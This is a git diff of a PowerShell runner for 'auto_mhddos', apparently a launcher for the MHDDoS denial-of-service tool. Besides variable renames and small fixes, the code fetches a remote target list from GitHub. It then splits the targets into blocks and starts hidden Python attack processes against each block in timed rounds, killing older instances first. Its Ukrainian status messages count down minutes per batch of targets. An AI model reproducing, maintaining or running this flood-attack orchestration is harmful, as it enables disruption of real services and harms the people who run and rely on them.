@@ -13,14 +13,14 @@ $TargetsURI = 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runn
 
 $LiteBlockSize = 50;
 $BlockSize = $LiteBlockSize * 4;
-$BlockJobTime = 60;
+$MinutesPerBlock = 60;
 
 $ErrorActionPreference = "SilentlyContinue";
 $ProgressPreference = "SilentlyContinue";
 $WarningPreference = "SilentlyContinue";
 
-$RunnerVersion = "1.0.0 Alpha/ Winged ratel";
-if ($args -like "-lite") {
+$RunnerVersion = "1.0.0 Alpha / Winged ratel";
+if ($args -like "*-lite*") {
     $RunningLite = $true;
 }
 else {
@@ -40,9 +40,7 @@ Clear-Line $StartupMessage;
 Set-Location $PSScriptRoot;
 
 if (Test-Path $MhddosPath) {
-    $Runners = Get-CimInstance win32_process | `
-        Where-Object { $_.CommandLine -like "*$MhddosPath*" } | `
-        Select-Object -ExpandProperty ProcessId
+    $Runners = Get-ProcCmdline "$MhddosPath"
     if ($Runners.Count -gt 0) {
         while (($null -ne $Runners) -and ($Runners.Count -gt 0)) {
             foreach ($LockingID in $Runners) {
@@ -74,23 +72,23 @@ Start-Process -FilePath $PythonExe -ArgumentList $PyArgs -Wait -WindowStyle Hidd
 Clear-Line "Отримуємо список цілей...";
 $TargetList = Get-Targets $TargetsURI $RunningLite;
 $StopRequested = $false;
-$NewTask = $true;
+$StartTask = $true;
 [System.Collections.ArrayList]$IDList = @();
 
 while (-not $StopRequested) {
-    if ($NewTask -and (-not $RunningLite)) {
+    if ($StartTask -and (-not $RunningLite)) {
         $Targets = $TargetList | Spit-Array -size $BlockSize;
         foreach ($Target in $Targets) {
             if ($Target.Count -gt 0) {
                 $TargetString = $Target -join ' ';
                 $RunnerArgs = $('runner.py ' + $TargetString);
-                $PyProcess = Start-Process -FilePath $PythonExe -ArgumentList $RunnerArgs -WindowStyle Hidden;
+                $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $WorkDir -ArgumentList $RunnerArgs -WindowStyle Hidden -PassThru;
                 $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
                 $IDList += $PyProcess.Id;
             }
         }
     }
-    if ($NewTask -and $RunningLite) {
+    if ($StartTask -and $RunningLite) {
         $Targets = $TargetList | Spit-Array -size $LiteBlockSize;
         foreach ($Target in $Targets) {
             if ($Target.Count -gt 0) {
@@ -100,7 +98,7 @@ while (-not $StopRequested) {
                 # We REALLY do not want our system to hang.
                 $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
                 $StartedBlockJob = [System.DateTime]::Now;
-                $StopBlockJob = $StartedBlockJob.AddMinutes($BlockJobTime);
+                $StopBlockJob = $StartedBlockJob.AddMinutes($MinutesPerBlock);
                 while (($PyProcess.HasExited -eq $false) -and ($StopBlockJob -gt [System.DateTime]::Now)) {
                     $BlockJobLeft = [int] $($StopBlockJob - [System.DateTime]::Now).TotalMinutes;
                     Clear-Line "$BlockJobLeft хвилин братерства на $($Target.Count) цілей";
@@ -110,6 +108,5 @@ while (-not $StopRequested) {
                 Clear-Line "Відпрацювали $($Target.Count) цілей. Беремо наступний блок";
             }
         }
-        $NewTask = $true;
     }
 }
